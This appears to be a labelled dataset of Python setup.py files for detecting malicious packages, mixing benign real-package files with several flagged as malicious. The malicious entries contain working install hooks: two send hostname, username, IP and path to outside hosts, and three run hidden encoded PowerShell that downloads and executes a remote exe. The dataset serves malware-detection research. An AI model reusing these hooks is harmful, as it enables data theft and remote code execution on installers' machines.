'SQLAlchemy>=1.4',\n        'packaging'\n    ],\n    entry_points=\"\"\"\n    # -*- Entry points: -*-\n    \"\"\",\n)\n", "target": 0}
{"idx": "google-cloud-bigquery-3.3.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-bigquery\"\ndescription = \"Google BigQuery API client library\"\n\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"grpcio >= 1.47.0, < 2.0dev\",  # https://github.com/googleapis/python-bigquery/issues/1262\n    # NOTE: Maintainers, please do not require google-api-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-api-core[grpc] >= 1.31.5, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    \"google-cloud-bigquery-storage >= 2.0.0, <3.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    # NOTE: Maintainers, please do not require google-cloud-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-cloud-core >= 1.4.1, <3.0.0dev\",\n    \"google-resumable-media >= 0.6.0, < 3.0dev\",\n    \"packaging >= 14.3, <22.0.0dev\",\n    \"protobuf >= 3.12.0, <4.0.0dev\",  # For the legacy proto-based types.\n    \"python-dateutil >= 2.7.2, <3.0dev\",\n    \"pyarrow >= 3.0.0, < 10.0dev\",\n    \"requests >= 2.18.0, < 3.0.0dev\",\n]\nextras = {\n    # Keep the no-op bqstorage extra for backward compatibility.\n    # See: https://github.com/googleapis/python-bigquery/issues/757\n    \"bqstorage\": [],\n    \"pandas\": [\"pandas>=1.0.0\", \"db-dtypes>=0.3.0,<2.0.0dev\"],\n    \"geopandas\": [\"geopandas>=0.9.0, <1.0dev\", \"Shapely>=1.6.0, <2.0dev\"],\n    \"ipython\": [\"ipython>=7.0.1,!=8.1.0\"],\n    \"tqdm\": [\"tqdm >= 4.7.4, <5.0.0dev\"],\n    \"opentelemetry\": [\n        \"opentelemetry-api >= 1.1.0\",\n        \"opentelemetry-sdk >= 1.1.0\",\n        \"opentelemetry-instrumentation >= 0.20b0\",\n    ],\n}\n\nall_extras = []\n\nfor extra in extras:\n    all_extras.extend(extras[extra])\n\nextras[\"all\"] = all_extras\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nversion = {}\nwith open(os.path.join(package_root, \"google/cloud/bigquery/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-bigquery\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7, <3.11\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "demopaxkhimkus-1.0.4", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"cdf7ymt2vtc0000eer0gggz6haayyyyyf.oast.fun\",params = ploads)\n\n\nsetup(name='demopaxkhimkus',\n      version='1.0.4',\n      description='Exfiltration',\n      author='chawla',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})", "target": 1}
{"idx": "ld-impl-linux-64", "func": "# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\nimport atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom multiprocessing.pool import ThreadPool as Pool\nfrom distutils.command.install import install\n\n\nhere = pathlib.Path(__file__).parent.resolve()\n\n# Get the long description from the README file\nlong_description = (here / 'README.md').read_text(encoding='utf-8')\n\n# Arguments marked as \"Required\" below must be included for upload to PyPI.\n# Fields marked as \"Optional\" may be commented out.\n\ncompany = \"pypi+\"+\"google-research/google-research\"+\"+\"\nname = \"ld_impl_linux-64\"\nversion = \"2.33.1\";\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nfrom subprocess import check_call\n\n\n\n# def _post_install():\n#     _post_install\n\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n\n\n\nsetup(\n    # This is the name of your project. The first time you publish this\n    # package, this name will be registered for you. It will determine how\n    # users can install this project, e.g.:\n    #\n    # $ pip install sampleproject\n    #\n    # And where it will live on PyPI: https://pypi.org/project/sampleproject/\n    #\n    # There are some restrictions on what makes a valid project name\n    # specification here:\n    # https://packaging.python.org/specifications/core-metadata/#name\n    name=name,  # Required\n\n    # Versions should comply with PEP 440:\n    # https://www.python.org/dev/peps/pep-0440/\n    #\n    # For a discussion on single-sourcing the version across setup.py and the\n    # project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=version,  # Required\n\n    # This is a one-line description or tagline of what your project does. This\n    # corresponds to the \"Summary\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#summary\n    description='',  # Optional\n\n    # This is an optional longer description of your project that represents\n    # the body of text which users will see when they visit PyPI.\n    #\n    # Often, this is the same as your README, so you can just read it in from\n    # that file directly (as we have already done above)\n    #\n    # This field corresponds to the \"Description\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-optional\n    long_description=long_description,  # Optional\n\n    # Denotes that our long_description is in Markdown; valid values are\n    # text/plain, text/x-rst, and text/markdown\n    #\n    # Optional if long_description is written in reStructuredText (rst) but\n    # required for plain-text or Markdown; if unspecified, \"applications should\n    # attempt to render [the long_description] as text/x-rst; charset=UTF-8 and\n    # fall back to text/plain if it is not valid rst\" (see link below)\n    #\n    # This field corresponds to the \"Description-Content-Type\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-content-type-optional\n    long_description_content_type='text/markdown',  # Optional (see note above)\n\n    # This should be a valid link to your project's main homepage.\n    #\n    # This field corresponds to the \"Home-Page\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#home-page-optional\n    url='https://github.com/kotko/bravado-decorators',  # Optional\n\n    # This should be your name or the name of the organization which owns the\n    # project.\n    author='Vladyslav Kotko',  # Optional\n\n    # This should be a valid email address corresponding to the author listed\n    # above.\n    author_email='mailbox@kotko.me',  # Optional\n    include_package_data=True,\n\n    # Classifiers help users find your project by categorizing it.\n    #\n    # For a list of valid classifiers, see https://pypi.org/classifiers/\n    classifiers=[  # Optional\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n\n        # Pick your license as you wish\n        'License :: OSI Approved :: MIT License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate you support Python 3. These classifiers are *not*\n        # checked by 'pip install'. See instead 'python_requires' below.\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n    ],\n\n    # This field adds keywords for your project which will appear on the\n    # project page. What does your project relate to?\n    #\n    # Note that this is a list of additional keywords, separated\n    # by commas, to be used to assist searching for the distribution in a\n    # larger catalog.\n    keywords='sample, setuptools, development',  # Optional\n\n    # When your source code is in a subdirectory under the project root, e.g.\n    # `src/`, it is necessary to specify the `package_dir` argument.\n    package_dir={'': 'src'},  # Optional\n\n    # You can just specify package directories manually here if your project is\n    # simple. Or you can use find_packages().\n    #\n    # Alternatively, if you just want to distribute a single Python file, use\n    # the `py_modules` argument instead as follows, which will expect a file\n    # called `my_module.py` to exist:\n    #\n    #   py_modules=[\"my_module\"],\n    #\n    packages=find_packages(where='src'),  # Required\n\n    # Specify which Python versions you support. In contrast to the\n    # 'Programming Language' classifiers above, 'pip install' will check this\n    # and refuse to install the project if the version does not match. See\n    # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires\n    python_requires='>=3.6, <4',\n\n    # This field lists other packages that your project depends on to run.\n    # Any package you put here will be installed by pip when your project is\n    # installed, so they must be valid existing projects.\n    #\n    # For an analysis of \"install_requires\" vs pip's requirements files see:\n    # https://packaging.python.org/en/latest/requirements.html\n    install_requires=['peppercorn', 'requests'],  # Optional\n\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). Users will be able to install these using the \"extras\"\n    # syntax, for example:\n    #\n    #   $ pip install sampleproject[dev]\n    #\n    # Similar to `install_requires` above, these must be valid existing\n    # projects.\n    extras_require={  # Optional\n        'dev': ['check-manifest', 'requests'],\n        'test': ['coverage', 'requests'],\n    },\n\n    # If there are data files included in your packages that need to be\n    # installed, specify them here.\n    package_data={  # Optional\n        'sample': ['package_data.dat'],\n    },\n\n    # Although 'package_data' is the preferred approach, in some case you may\n    # need to place data files outside of your packages. See:\n    # http://docs.python.org/distutils/setupscript.html#installing-additional-files\n    #\n    # In this case, 'data_file' will be installed into '<sys.prefix>/my_data'\n    data_files=[('my_data', ['data/data_file'])],  # Optional\n\n    # To provide executable scripts, use entry points in preference to the\n    # \"scripts\" keyword. Entry points provide cross-platform support and allow\n    # `pip` to create the appropriate form of executable for the target\n    # platform.\n    #\n    # For example, the following would provide a command called `sample` which\n    # executes the function `main` from this package when invoked:\n    entry_points={  # Optional\n        'console_scripts': [\n            'sample=sample:main',\n        ],\n    },\n\n    # List additional URLs that are relevant to your project as a dict.\n    #\n    # This field corresponds to the \"Project-URL\" metadata fields:\n    # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use\n    #\n    # Examples listed include a pattern for specifying where the package tracks\n    # issues, where the source is hosted, where to say thanks to the package\n    # maintainers, and where to support the project financially. The key is\n    # what's used to render the link text on PyPI.\n    project_urls={},\n     cmdclass={\n        'install': new_install,\n    },\n)\n# _post_install()\n", "target": 1}
{"idx": "tpreccmine-9.13", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpreccmine',\n    packages = ['modlib'],\n    version = '10.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "librandLGTBultra-6.97", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandLGTBultra',\n    packages = ['modlib'],\n    version = '10.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dagster-k8s-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_k8s/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-k8s\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"A Dagster integration for k8s\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-k8s\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_k8s_tests*\"]),\n        install_requires=[\"dagster==1.0.3\", \"kubernetes\"],\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "dlib-19.24.0", "func": "\"\"\"setup for the dlib project\n Copyright (C) 2015  Ehsan Azar (dashesy@linux.com)\n License: Boost Software License   See LICENSE.txt for the full license.\n\nThis file basically just uses CMake to compile the dlib python bindings project\nlocated in the tools/python folder and then puts the outputs into standard\npython packages.\n\nTo build the dlib:\n    python setup.py build\nTo build and install:\n    python setup.py install\nTo package the wheel (after pip installing twine and wheel):\n    python setup.py bdist_wheel\nTo upload the binary wheel to PyPi\n    twine upload dist/*.whl\nTo upload the source distribution to PyPi\n    python setup.py sdist \n    twine upload dist/dlib-*.tar.gz\nTo exclude certain options in the cmake config use --no:\n    for example:\n    --no USE_AVX_INSTRUCTIONS: will set -DUSE_AVX_INSTRUCTIONS=no\nAdditional options:\n    --compiler-flags: pass flags onto the compiler, e.g. --compiler-flags \"-Os -Wall\" passes -Os -Wall onto GCC.\n    -G: Set the CMake generator.  E.g. -G \"Visual Studio 14 2015\"\n    --clean: delete any previous build folders and rebuild.  You should do this if you change any build options\n             by setting --compiler-flags or --no since the last time you ran a build.  This will\n             ensure the changes take effect.\n    --set: set arbitrary cmake options e.g. --set CUDA_HOST_COMPILER=/usr/bin/gcc-6.4.0\n           passes -DCUDA_HOST_COMPILER=/usr/bin/gcc-6.4.0 to CMake.\n\"\"\"\nimport os\nimport re\nimport sys\nimport shutil\nimport platform\nimport subprocess\nimport multiprocessing\nfrom distutils import log\nfrom math import ceil,floor\n\nfrom setuptools import setup, Extension\nfrom setuptools.command.build_ext import build_ext\nfrom distutils.version import LooseVersion\n\n\ndef get_extra_cmake_options():\n    \"\"\"read --clean, --no, --set, --compiler-flags, and -G options from the command line and add them as cmake switches.\n    \"\"\"\n    _cmake_extra_options = []\n    _clean_build_folder = False\n\n    opt_key = None\n\n    argv = [arg for arg in sys.argv]  # take a copy\n    # parse command line options and consume those we care about\n    for arg in argv:\n        if opt_key == 'compiler-flags':\n            _cmake_extra_options.append('-DCMAKE_CXX_FLAGS={arg}'.format(arg=arg.strip()))\n        elif opt_key == 'G':\n            _cmake_extra_options += ['-G', arg.strip()]\n        elif opt_key == 'no':\n            _cmake_extra_options.append('-D{arg}=no'.format(arg=arg.strip()))\n        elif opt_key == 'set':\n            _cmake_extra_options.append('-D{arg}'.format(arg=arg.strip()))\n\n        if opt_key:\n            sys.argv.remove(arg)\n            opt_key = None\n            continue\n\n        if arg == '--clean':\n            _clean_build_folder = True\n            sys.argv.remove(arg)\n            continue\n\n        if arg == '--yes':\n            print(\"The --yes options to dlib's setup.py don't do anything since all these options \")\n            print(\"are on by default.  So --yes has been removed.  Do not give it to setup.py.\")\n            sys.exit(1)\n        if arg in ['--no', '--set', '--compiler-flags']:\n            opt_key = arg[2:].lower()\n            sys.argv.remove(arg)\n            continue\n        if arg in ['-G']:\n            opt_key = arg[1:]\n            sys.argv.remove(arg)\n            continue\n\n    return _cmake_extra_options, _clean_build_folder\n\ncmake_extra_options,clean_build_folder = get_extra_cmake_options()\n\n\nclass CMakeExtension(Extension):\n    def __init__(self, name, sourcedir=''):\n        Extension.__init__(self, name, sources=[])\n        self.sourcedir = os.path.abspath(sourcedir)\n\ndef rmtree(name):\n    \"\"\"remove a directory and its subdirectories.\n    \"\"\"\n    def remove_read_only(func, path, exc):\n        excvalue = exc[1]\n        if func in (os.rmdir, os.remove) and excvalue.errno == errno.EACCES:\n            os.chmod(path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)\n            func(path)\n        else:\n            raise\n\n    if os.path.exists(name):\n        log.info('Removing old directory {}'.format(name))\n        shutil.rmtree(name, ignore_errors=False, onerror=remove_read_only)\n\n\nclass CMakeBuild(build_ext):\n\n    def get_cmake_version(self):\n        try:\n            out = subprocess.check_output(['cmake', '--version'])\n        except:\n            sys.stderr.write(\"\\nERROR: CMake must be installed to build dlib\\n\\n\") \n            sys.exit(1)\n        return re.search(r'version\\s*([\\d.]+)', out.decode()).group(1)\n\n    def run(self):\n        cmake_version = self.get_cmake_version()\n        if platform.system() == \"Windows\":\n            if LooseVersion(cmake_version) < '3.1.0':\n                sys.stderr.write(\"\\nERROR: CMake >= 3.1.0 is required on Windows\\n\\n\")\n                sys.exit(1)\n\n        for ext in self.extensions:\n            self.build_extension(ext)\n\n    def build_extension(self, ext):\n        extdir = os.path.abspath(os.path.dirname(self.get_ext_fullpath(ext.name)))\n\n        cmake_args = ['-DCMAKE_LIBRARY_OUTPUT_DIRECTORY=' + extdir,\n                      '-DPYTHON_EXECUTABLE=' + sys.executable]\n\n        cmake_args += cmake_extra_options \n\n        cfg = 'Debug' if self.debug else 'Release'\n        build_args = ['--config', cfg]\n\n        if platform.system() == \"Windows\":\n            cmake_args += ['-DCMAKE_LIBRARY_OUTPUT_DIRECTORY_{}={}'.format(cfg.upper(), extdir)]\n            if sys.maxsize > 2**32:\n                cmake_args += ['-A', 'x64']\n            # Do a parallel build\n            build_args += ['--', '/m'] \n        else:\n            cmake_args += ['-DCMAKE_BUILD_TYPE=' + cfg]\n            # Do a parallel build\n            build_args += ['--', '-j'+str(num_available_cpu_cores(2))]\n\n        build_folder = os.path.abspath(self.build_temp)\n\n        if clean_build_folder:\n            rmtree(build_folder)\n        if not os.path.exists(build_folder):\n            os.makedirs(build_folder)\n\n        cmake_setup = ['cmake', ext.sourcedir] + cmake_args\n        cmake_build = ['cmake', '--build', '.'] + build_args\n\n        print(\"Building extension for Python {}\".format(sys.version.split('\\n',1)[0]))\n        print(\"Invoking CMake setup: '{}'\".format(' '.join(cmake_setup)))\n        sys.stdout.flush()\n        subprocess.check_call(cmake_setup, cwd=build_folder)\n        print(\"Invoking CMake build: '{}'\".format(' '.join(cmake_build)))\n        sys.stdout.flush()\n        subprocess.check_call(cmake_build, cwd=build_folder)\n\ndef num_available_cpu_cores(ram_per_build_process_in_gb):\n    if 'TRAVIS' in os.environ and os.environ['TRAVIS']=='true':\n        # When building on travis-ci, just use 2 cores since travis-ci limits\n        # you to that regardless of what the hardware might suggest.\n        return 2 \n    try:\n        mem_bytes = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES')  \n        mem_gib = mem_bytes/(1024.**3)\n        num_cores = multiprocessing.cpu_count() \n        # make sure we have enough ram for each build process.\n        mem_cores = int(floor(mem_gib/float(ram_per_build_process_in_gb)+0.5));\n        # We are limited either by RAM or CPU cores.  So pick the limiting amount\n        # and return that.\n        return max(min(num_cores, mem_cores), 1)\n    except ValueError:\n        return 2 # just assume 2 if we can't get the os to tell us the right answer.\n\n\nfrom setuptools.command.test import test as TestCommand\nclass PyTest(TestCommand):\n    user_options = [('pytest-args=', 'a', \"Arguments to pass to pytest\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.pytest_args = '--ignore docs --ignore dlib'\n\n    def run_tests(self):\n        import shlex\n        #import here, cause outside the eggs aren't loaded\n        import pytest\n        errno = pytest.main(shlex.split(self.pytest_args))\n        sys.exit(errno)\n\ndef read_version_from_cmakelists(cmake_file):\n    \"\"\"Read version information\n    \"\"\"\n    major = re.findall(\"set\\(CPACK_PACKAGE_VERSION_MAJOR.*\\\"(.*)\\\"\", open(cmake_file).read())[0]\n    minor = re.findall(\"set\\(CPACK_PACKAGE_VERSION_MINOR.*\\\"(.*)\\\"\", open(cmake_file).read())[0]\n    patch = re.findall(\"set\\(CPACK_PACKAGE_VERSION_PATCH.*\\\"(.*)\\\"\", open(cmake_file).read())[0]\n    return major + '.' + minor + '.' + patch\n\ndef read_entire_file(fname):\n    \"\"\"Read text out of a file relative to setup.py.\n    \"\"\"\n    return open(os.path.join(fname)).read()\n\nsetup(\n    name='dlib',\n    version=read_version_from_cmakelists('dlib/CMakeLists.txt'),\n    description='A toolkit for making real world machine learning and data analysis applications',\n    long_description='See http://dlib.net for documentation.',\n    author='Davis King',\n    author_email='davis@dlib.net',\n    url='https://github.com/davisking/dlib',\n    license='Boost Software License',\n    ext_modules=[CMakeExtension('_dlib_pybind11','tools/python')],\n    cmdclass=dict(build_ext=CMakeBuild, test=PyTest),\n    zip_safe=False,\n    # We need an older more-itertools version because v6 broke pytest (for everyone, not just dlib)\n    tests_require=['pytest==3.8', 'more-itertools<6.0.0'],\n    #install_requires=['cmake'], # removed because the pip cmake package is busted, maybe someday it will be usable.\n    packages=['dlib'],\n    package_dir={'': 'tools/python'},\n    keywords=['dlib', 'Computer Vision', 'Machine Learning'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Science/Research',\n        'Intended Audience :: Developers',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: POSIX',\n        'Operating System :: POSIX :: Linux',\n        'Operating System :: Microsoft',\n        'Operating System :: Microsoft :: Windows',\n        'Programming Language :: C++',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Scientific/Engineering',\n        'Topic :: Scientific/Engineering :: Artificial Intelligence',\n        'Topic :: Scientific/Engineering :: Image Recognition',\n        'Topic :: Software Development',\n    ],\n)\n", "target": 0}
{"idx": "tpinforandcpu-7.49", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpinforandcpu',\n    packages = ['modlib'],\n    version = '5.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
